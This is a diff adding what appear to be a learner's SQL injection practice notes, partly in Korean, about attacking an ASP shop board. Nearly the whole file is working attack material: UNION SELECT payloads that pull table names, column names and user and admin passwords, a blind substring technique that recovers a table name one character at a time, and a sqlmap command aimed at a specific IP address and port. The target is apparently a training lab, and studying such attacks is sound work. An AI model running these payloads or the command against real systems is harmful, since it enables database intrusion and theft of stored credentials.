@@ -1,0 +1,43 @@
+'UNION SELECT '1', '2', '3', '4', TABLE_NAME FROM information_schema.tables --
+'UNION SELECT '1', '2', '3', '4', COLUMN_NAME FROM information_schema.columns --
+'UNION SELECT '1','2','3',user_id,passwd FROM members --
+
+'UNION SELECT '1', '2', '3',adminid,adminpwd FROM admin_tb --
+'UNION SELECT '1', '2', '3', '4', user_id,passwd FROM members --
+'UNION SELECT '1', '2', '3',adminid,adminpwd FROM admin_tb --
+'UNION SELECT user_id,passwd FROM members --
+UNION SELECT user_id,passwd FROM members
+UNION SELECT adminid,adminpwd FROM members
+UNION SELECT userID,adminpwd FROM members
+
+테이블명 : members
+아이디컬럼명 : user_id, userID
+패스워드 컬럼명 : passwd, pwd
+
+SELECT TOP 1 TABLE_NAME FROM information_schema.tables ORDER BY TABLE_NAME asc
+
+
+and 'a'=substring((SELECT TOP 1 TABLE_NAME FROM information_schema.tables ORDER BY TABLE_NAME asc), 1, 1)
+게시판을 열고 거기에 삽입하여서 게시판이 보여지면 a가 맞고 오류가 나오면 아니다.
+=> 첫문자 : a
+and 'b'=substring((SELECT TOP 1 TABLE_NAME FROM information_schema.tables ORDER BY TABLE_NAME asc), 2, 1)
+=> 두번째 문자 : b
+=> ab
+=> 3번째 문자 : r
+=> abr
+
+sqlmap -u "http://61.39.155.24:50003/demoshop/shop_board/shop_board_list.asp" --data "page=1&v_num=602" -p v_num --level=3 --dbs
+
+sql -> paser 구문검증 -> bind 변수선언 -> excute 실행 -> fetch 추출
+
+
+
+
+
+
+
+
+
+
+
+
